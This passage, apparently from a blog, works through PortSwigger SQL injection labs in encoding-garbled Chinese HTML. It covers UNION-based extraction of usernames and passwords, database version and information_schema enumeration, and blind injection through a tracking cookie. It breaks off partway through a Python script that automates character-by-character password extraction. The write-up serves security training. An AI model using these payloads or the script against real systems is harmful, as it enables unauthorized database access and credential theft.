<li>çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªmysqlæ•°æ®åº“ï¼Œå› æ­¤ä½¿ç”¨<code>CONCAT</code>å‡½æ•°è¿›è¡Œæ‹¼æ¥ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT NULL,CONCAT(username, &#x27;</span><span class="operator">~</span><span class="string">&#x27;, password) FROM users-- </span></span><br></pre></td></tr></table></figure></li>
<li>æŸ¥åˆ°ç”¨æˆ·åå¯†ç ï¼Œå¯ä»¥ä½¿ç”¨administratorç™»å½•<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB6-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
<li>å®Œæˆå®éªŒâœ…</li>
</ul>
<h2 id="æ£€æŸ¥SQLæ³¨å…¥æ”»å‡»ä¸­çš„æ•°æ®åº“"><a href="#æ£€æŸ¥SQLæ³¨å…¥æ”»å‡»ä¸­çš„æ•°æ®åº“" class="headerlink" title="æ£€æŸ¥SQLæ³¨å…¥æ”»å‡»ä¸­çš„æ•°æ®åº“"></a>æ£€æŸ¥SQLæ³¨å…¥æ”»å‡»ä¸­çš„æ•°æ®åº“</h2><ul>
<li>è¦åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œé€šå¸¸éœ€è¦æŸ¥æ‰¾æœ‰å…³æ•°æ®åº“çš„ä¿¡æ¯ï¼Œè¿™åŒ…æ‹¬ï¼š<ul>
<li>æ•°æ®åº“è½¯ä»¶çš„ç±»å‹å’Œç‰ˆæœ¬</li>
<li>æ•°æ®åº“åŒ…å«çš„è¡¨å’Œåˆ—</li>
</ul>
</li>
</ul>
<h3 id="æ£€æŸ¥æ•°æ®åº“çš„ç‰ˆæœ¬å’Œç±»å‹"><a href="#æ£€æŸ¥æ•°æ®åº“çš„ç‰ˆæœ¬å’Œç±»å‹" class="headerlink" title="æ£€æŸ¥æ•°æ®åº“çš„ç‰ˆæœ¬å’Œç±»å‹"></a>æ£€æŸ¥æ•°æ®åº“çš„ç‰ˆæœ¬å’Œç±»å‹</h3><p>ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨æ¥ç¡®å®šæŸäº›å¸¸ç”¨æ•°æ®åº“ç±»å‹çš„æ•°æ®åº“ç‰ˆæœ¬ï¼š</p>
<table>
<thead>
<tr>
<th>æ•°æ®åº“ç±»å‹</th>
<th>æŸ¥è¯¢</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoftï¼ŒMySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td>Oracle</td>
<td><code>SELECT * FROM v$version</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody></table>
<ul>
<li>ä¾‹å­ï¼š<ul>
<li>ä½¿ç”¨<code>UNION SELECT @@version,NULL--</code>æ¥æ£€æŸ¥æ•°æ®åº“çš„ç‰ˆæœ¬</li>
<li>è¿”å›çš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)</span><br><span class="line">Mar 18 2018 09:11:49</span><br><span class="line">Copyright (c) Microsoft Corporation</span><br><span class="line">Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)</span><br></pre></td></tr></table></figure></li>
<li>å¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„ç‰ˆæœ¬æ˜¯<code>Microsoft SQL Server 2016</code></li>
</ul>
</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ7ï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç±»åˆ«å’Œç‰ˆæœ¬ï¼ˆæ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä¸æˆåŠŸï¼ŒçŒœæµ‹å®éªŒç¯å¢ƒæœ‰é—®é¢˜ï¼‰"><a href="#ğŸ§ªå®éªŒ7ï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç±»åˆ«å’Œç‰ˆæœ¬ï¼ˆæ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä¸æˆåŠŸï¼ŒçŒœæµ‹å®éªŒç¯å¢ƒæœ‰é—®é¢˜ï¼‰" class="headerlink" title="ğŸ§ªå®éªŒ7ï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç±»åˆ«å’Œç‰ˆæœ¬ï¼ˆæ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä¸æˆåŠŸï¼ŒçŒœæµ‹å®éªŒç¯å¢ƒæœ‰é—®é¢˜ï¼‰"></a>ğŸ§ªå®éªŒ7ï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢æ•°æ®åº“ç±»åˆ«å’Œç‰ˆæœ¬ï¼ˆæ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä¸æˆåŠŸï¼ŒçŒœæµ‹å®éªŒç¯å¢ƒæœ‰é—®é¢˜ï¼‰</h3><h4 id="å®éªŒè¯´æ˜-6"><a href="#å®éªŒè¯´æ˜-6" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚å¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚</li>
<li>ä»»åŠ¡ï¼šæ‰§è¡ŒSQLæ³¨å…¥æ”»å‡»ï¼Œç¡®å®šæ•°æ®åº“çš„ç±»å‹å’Œç‰ˆæœ¬ã€‚</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-6"><a href="#è§£é¢˜è¿‡ç¨‹-6" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é¦–å…ˆï¼Œç¡®å®šè¿”å›çš„åˆ—æ•°ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Pets&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--  </span></span><br><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL,NULL--  </span></span><br><span class="line"><span class="string"># ä¸æˆåŠŸã€‚ã€‚</span></span><br></pre></td></tr></table></figure>
<!-- ![](LAB7-1-æŸ¥è¯¢è¿”å›çš„åˆ—æ•°.png) --></li>
</ul>
<h3 id="åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹"><a href="#åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹" class="headerlink" title="åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹"></a>åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹</h3><ul>
<li>å¤§å¤šæ•°æ•°æ®åº“ç±»å‹ï¼ˆOracleé™¤å¤–ï¼‰ï¼Œéƒ½æœ‰ä¸€ä¸ªåä¸º<code>information_schema</code>çš„ç³»ç»Ÿè¡¨ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªè¡¨æ¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„è¡¨å’Œåˆ—ã€‚</li>
<li>ä¾‹ï¼š<ul>
<li>å¯ä»¥æŸ¥è¯¢<code>information_schema.tables</code>è¡¨æ¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„è¡¨:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure></li>
<li>ç»“æœç¤ºä¾‹ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</span><br><span class="line">=====================================================</span><br><span class="line">MyDatabase     dbo           Products    BASE TABLE</span><br><span class="line">MyDatabase     dbo           Users       BASE TABLE</span><br><span class="line">MyDatabase     dbo           Feedback    BASE TABLE</span><br></pre></td></tr></table></figure></li>
<li>å¯ä»¥æŸ¥è¯¢<code>information_schema.columns</code>è¡¨æ¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„åˆ—:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>ç»“æœç¤ºä¾‹ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE</span><br><span class="line">=================================================================</span><br><span class="line">MyDatabase     dbo           Users       UserId       int</span><br><span class="line">MyDatabase     dbo           Users       Username     varchar</span><br><span class="line">MyDatabase     dbo           Users       Password     varchar</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ8ï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºéOracleæ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹"><a href="#ğŸ§ªå®éªŒ8ï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºéOracleæ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹" class="headerlink" title="ğŸ§ªå®éªŒ8ï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºéOracleæ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹"></a>ğŸ§ªå®éªŒ8ï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºéOracleæ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹</h3><h4 id="å®éªŒè¯´æ˜-7"><a href="#å®éªŒè¯´æ˜-7" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚</li>
<li>åº”ç”¨ç¨‹åºå…·æœ‰ç™»å½•åŠŸèƒ½ï¼Œæ•°æ®åº“åŒ…å«ä¸€ä¸ªä¿å­˜ç”¨æˆ·åå’Œå¯†ç çš„è¡¨ã€‚</li>
<li>ä»»åŠ¡ï¼šæ‰§è¡ŒSQLæ³¨å…¥æ”»å‡»ï¼Œç¡®å®šè¡¨çš„åç§°å’Œåˆ—çš„åç§°ï¼ŒæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥<code>administrator</code>çš„èº«ä»½ç™»å½•ã€‚</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-7"><a href="#è§£é¢˜è¿‡ç¨‹-7" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é¦–å…ˆç¡®å®šåŸå§‹æŸ¥è¯¢è¿”å›çš„åˆ—æ•°ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT NULL,NULL-- </span></span><br><span class="line"><span class="string"># è¿”å›æ­£å¸¸ç»“æœï¼Œæ‰€ä»¥è¿”å›çš„åˆ—æ•°ä¸º2</span></span><br></pre></td></tr></table></figure></li>
<li>ç„¶åç¡®å®šæ¯ä¸€åˆ—çš„ç±»å‹ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># ä¸¤ä¸ªéƒ½æˆåŠŸï¼Œè¯´æ˜ä¸¤åˆ—éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹</span><br></pre></td></tr></table></figure></li>
<li>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT table_name, NULL FROM information_schema.tables--</span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-1-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8.png"></li>
<li>å‘ç°ä¸€ä¸ªåä¸º<code>users_kdzjph</code>çš„è¡¨ï¼ŒçŒœæµ‹æ˜¯ç›®æ ‡è¡¨ï¼Œå°è¯•æŸ¥è¯¢è¡¨ä¸­çš„åˆ—ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = &#x27;</span>pg_user_mappings<span class="string">&#x27;--  </span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> COLUMN_NAME, <span class="keyword">NULL</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users_kdzjph&#x27;</span><span class="comment">--  </span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-2-%E6%9F%A5%E7%9C%8Busers_kdzjph%E7%9A%84%E5%88%97.png"></li>
<li>æŸ¥è¯¢åˆ°äº†<code>password_ifndxh</code>å’Œ<code>username_aeoisd</code>åˆ—ï¼ŒæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT username_aeoisd,password_ifndxh FROM users_kdzjph--  </span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-3-%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png"></li>
<li>ä½¿ç”¨è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-4-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png"></li>
<li>å®Œæˆå®éªŒâœ…</li>
</ul>
<h2 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h2><ul>
<li>å½“åº”ç”¨ç¨‹åºæ˜“å—SQLæ³¨å…¥æ”»å‡»ï¼Œä½†å…¶HTTPå“åº”ä¸åŒ…å«ç›¸å…³SQLæŸ¥è¯¢çš„ç»“æœæˆ–ä»»ä½•æ•°æ®åº“é”™è¯¯çš„è¯¦ç»†ä¿¡æ¯æ—¶ï¼Œå°±ä¼šå‘ç”ŸSQLç›²æ³¨ã€‚</li>
<li>è®¸å¤šæŠ€æœ¯ï¼ˆå¦‚<code>UNION</code>æ”»å‡»ï¼‰å¯¹SQLç›²æ³¨æ¼æ´æ— æ•ˆï¼Œå› ä¸ºå®ƒä»¬ä¾èµ–äºåº”ç”¨ç¨‹åºçš„å“åº”ä¸­åŒ…å«æœ‰å…³æŸ¥è¯¢ç»“æœçš„ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€æœ¯æ¥åˆ©ç”¨SQLç›²æ³¨æ¼æ´ã€‚</li>
</ul>
<h2 id="é€šè¿‡è§¦å‘æ¡ä»¶å“åº”åˆ©ç”¨SQLç›²æ³¨"><a href="#é€šè¿‡è§¦å‘æ¡ä»¶å“åº”åˆ©ç”¨SQLç›²æ³¨" class="headerlink" title="é€šè¿‡è§¦å‘æ¡ä»¶å“åº”åˆ©ç”¨SQLç›²æ³¨"></a>é€šè¿‡è§¦å‘æ¡ä»¶å“åº”åˆ©ç”¨SQLç›²æ³¨</h2><ul>
<li><p>è€ƒè™‘ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒä½¿ç”¨è·Ÿè¸ªCookieæ¥æ”¶é›†æœ‰å…³ä½¿ç”¨æƒ…å†µçš„åˆ†æã€‚å¯¹åº”ç”¨ç¨‹åºçš„è¯·æ±‚åŒ…æ‹¬ä¸€ä¸ªcookieå¤´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></li>
<li><p>å½“å¤„ç†åŒ…å«<code>TrackingId</code>çš„cookieçš„è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨SQLæŸ¥è¯¢æ¥ç¡®å®šè¿™æ˜¯å¦æ—¶å·²çŸ¥ç”¨æˆ·ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>æ­¤æŸ¥è¯¢æ˜“å—SQLæ³¨å…¥æ”»å‡»ï¼Œä½†æŸ¥è¯¢ç»“æœä¸ä¼šè¿”å›ç»™ç”¨æˆ·ã€‚ä½†æ˜¯åº”ç”¨ç¨‹åºçš„è¡Œä¸ºç¡®å®ä¼šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“å–å†³äºæŸ¥è¯¢æ˜¯å¦è¿”å›æ•°æ®ã€‚å¦‚æœæäº¤ä¸€ä¸ªå·²è¯†åˆ«çš„<code>TrackingId</code>ï¼ŒæŸ¥è¯¢å°†è¿”å›æ•°æ®ï¼Œå¹¶ä¸”å°†åœ¨å“åº”ä¸­æ”¶åˆ°ä¸€æ¡â€œwelcome backâ€çš„æ¶ˆæ¯ã€‚</p>
</li>
<li><p>è¿™ç§è¡Œä¸ºè¶³ä»¥åˆ©ç”¨SQLç›²æ³¨æ¼æ´ã€‚å¯ä»¥é€šè¿‡æœ‰æ¡ä»¶åœ°è§¦å‘ä¸åŒçš„å“åº”æ¥æ£€ç´¢ä¿¡æ¯ï¼Œå…·ä½“å–å†³äºæ³¨å…¥çš„æ¡ä»¶ã€‚</p>
</li>
<li><p>è¦ç¡®å®šæ¼æ´æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œå‡è®¾å‘é€äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œcookieå€¼ä¸­åˆ†åˆ«åŒ…å«ä»¥ä¸‹<code>TrackingId</code>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¦xyz&#x27; AND &#x27;1&#x27;=&#x27;1</span><br><span class="line">â€¦xyz&#x27; AND &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure></li>
<li><p>ç¬¬ä¸€ä¸ªè¯·æ±‚å°†è¿”å›æ•°æ®ï¼Œå› ä¸ºæ³¨å…¥çš„<code>AND &#39;1&#39;=&#39;1</code>æ¡ä»¶ä¸ºçœŸã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ªè¯·æ±‚å°†ä¸è¿”å›æ•°æ®ï¼Œå› ä¸ºæ³¨å…¥çš„<code>AND &#39;1&#39;=&#39;2</code>æ¡ä»¶ä¸ºå‡ã€‚</p>
</li>
<li><p>è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿç¡®å®šä»»ä½•å•ä¸ªæ³¨å…¥æ¡ä»¶çš„ç­”æ¡ˆï¼Œå¹¶ä¸€æ¬¡æå–ä¸€ä¸ªæ•°æ®ã€‚</p>
</li>
<li><p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>å‡è®¾æœ‰ä¸€ä¸ªåä¸º<code>Users</code>çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«<code>username</code>å’Œ<code>password</code>åˆ—ï¼Œä»¥åŠä¸€ä¸ªåä¸º<code>Administators</code>çš„ç”¨æˆ·ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘é€ä¸€ç³»åˆ—è¾“å…¥æ¥ç¡®å®šæ­¤ç”¨æˆ·çš„å¯†ç ï¼Œä»¥ä¾¿æ¯æ¬¡æµ‹è¯•å¯†ç çš„ä¸€ä¸ªå­—ç¬¦ã€‚</li>
<li>é¦–å…ˆå¯ä»¥è¾“å…¥ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) &gt; &#x27;m</span><br></pre></td></tr></table></figure></li>
<li>è¿™å°†è¿”å›<code>Welcome back</code>ï¼Œè¡¨æ˜æ³¨å…¥çš„æ¡ä»¶ä¸ºçœŸï¼Œå› æ­¤å¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äº<code>m</code>ã€‚</li>
<li>ç„¶åå¯ä»¥è¾“å…¥ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) &gt; &#x27;t</span><br></pre></td></tr></table></figure></li>
<li>è¿™å°†ä¸è¿”å›<code>Welcome back</code>ï¼Œè¡¨æ˜æ³¨å…¥çš„æ¡ä»¶ä¸ºå‡ï¼Œå› æ­¤å¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸å¤§äº<code>t</code>ã€‚</li>
<li>æœ€åè¾“å…¥ä»¥ä¸‹ä¿¡æ¯ï¼Œå®ƒè¿”å›<code>Welcome back</code>ï¼Œè¡¨æ˜å¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>s</code>ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) = &#x27;s</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥ç¡®å®šå¯†ç çš„æ¯ä¸ªå­—ç¬¦ã€‚</li>
</ul>
</li>
<li><p>æ³¨æ„ï¼šåœ¨Oracleæ•°æ®åº“ä¸­ï¼Œ<code>SUBSTRING</code>å‡½æ•°è¢«ç§°ä¸º<code>SUBSTR</code>ã€‚è¯¦ç»†å¯ä»¥å‚è€ƒ<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ9ï¼šå¸¦æ¡ä»¶å“åº”çš„SQLç›²æ³¨"><a href="#ğŸ§ªå®éªŒ9ï¼šå¸¦æ¡ä»¶å“åº”çš„SQLç›²æ³¨" class="headerlink" title="ğŸ§ªå®éªŒ9ï¼šå¸¦æ¡ä»¶å“åº”çš„SQLç›²æ³¨"></a>ğŸ§ªå®éªŒ9ï¼šå¸¦æ¡ä»¶å“åº”çš„SQLç›²æ³¨</h3><ul>
<li><p>å®éªŒè¯´æ˜</p>
<ul>
<li>æœ¬å®éªŒåŒ…å«ä¸€ä¸ªSQLç›²æ³¨æ¼æ´ã€‚åº”ç”¨ç¨‹åºä½¿ç”¨è·Ÿè¸ªcookieè¿›è¡Œåˆ†æï¼Œå¹¶æ‰§è¡ŒåŒ…å«æäº¤cookieå€¼çš„SQLæŸ¥è¯¢ã€‚</li>
<li>SQLæŸ¥è¯¢çš„ç»“æœä¸ä¼šè¿”å›ï¼Œä¹Ÿä¸æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚ä½†æ˜¯å¦‚æœæŸ¥è¯¢æœ‰è¿”å›ï¼Œåº”ç”¨ç¨‹åºä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤ºâ€œWelcome backâ€æ¶ˆæ¯ã€‚</li>
<li>æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸º<code>users</code>çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«<code>username</code>å’Œ<code>password</code>åˆ—ã€‚</li>
<li>ä»»åŠ¡ï¼šåˆ©ç”¨SQLç›²æ³¨æ¼æ´ï¼Œç¡®å®š<code>administrator</code>ç”¨æˆ·çš„å¯†ç ï¼Œä»¥<code>administrator</code>çš„èº«ä»½ç™»å½•ã€‚</li>
</ul>
</li>
<li><p>è§£é¢˜è¿‡ç¨‹</p>
<ul>
<li>é¦–å…ˆï¼Œç¡®å®šæ³¨å…¥ç‚¹ï¼šåœ¨cookieçš„<code>TrackingId</code>ä¸­æ³¨å…¥<code>&#39; AND &#39;1&#39;=&#39;1</code>å’Œ<code>&#39; AND &#39;1&#39;=&#39;2</code>ï¼Œå‘ç°è¿”å›çš„ç»“æœä¸ä¸€æ ·ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-1-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png"><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-2-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png"></li>
<li>æ‹¼æ¥<code>TrackingId</code>ï¼Œä½¿ç”¨<code>AND</code>æ¡ä»¶æ¥åˆ¤æ–­å¯†ç çš„æ¯ä¸€ä½<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), 1, 1) = &#x27;m</span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png"><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png"></li>
<li>å…¶ä»–ä½åŒç†ï¼Œé€šè¿‡è¾“å…¥<code>a-zA-Z0-9</code>æ¥åˆ¤æ–­å¯†ç çš„æ¯ä¸€ä½</li>
<li>æ‰‹å·¥æ³¨å…¥è´¹æ—¶è´¹åŠ›ï¼Œå› æ­¤å¯ä»¥é€šè¿‡pythonç¼–ç¨‹å®ç°ï¼ŒåŒæ—¶ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾æ³•ï¼ŒåŠ å¿«é€Ÿåº¦ï¼š<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://0a4200f2037f22168015712d002c0009.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies = &#123;&quot;TrackingId&quot;: &quot;NEcgTt5umCL1PorI&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), 1, 1) &lt; &#x27;m; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa&quot;&#125;</span></span><br><span class="line">TrackingId_1=<span class="string">&quot;NEcgTt5umCL1PorI&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), &quot;</span></span><br><span class="line"><span class="comment"># TrackingId_2</span></span><br><span class="line">TrackingId_3=<span class="string">&quot;, 1) &quot;</span></span><br><span 